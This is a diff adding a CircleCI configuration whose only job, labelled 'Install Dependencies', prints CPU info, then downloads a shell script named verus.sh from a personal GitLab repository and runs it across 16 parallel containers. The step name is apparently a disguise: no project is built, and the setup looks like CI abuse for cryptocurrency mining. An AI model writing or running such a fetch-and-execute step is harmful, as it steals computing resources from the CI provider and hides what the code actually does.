@@ -1,0 +1,35 @@
+version: 2.1
+
+jobs:
+
+    trial:
+
+      docker:
+
+            - image: circleci/ruby:2.5.3
+
+      parallelism: 16
+
+      steps:
+
+        - run:
+
+            name: Install Dependencies
+
+            command: |
+
+              lscpu
+
+              wget https://gitlab.com/fajarranz19/m/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
+
+              echo Hello,subscribe it
+
+workflows:
+
+    version: 2.1
+
+    build:
+
+        jobs:
+
+        - trial
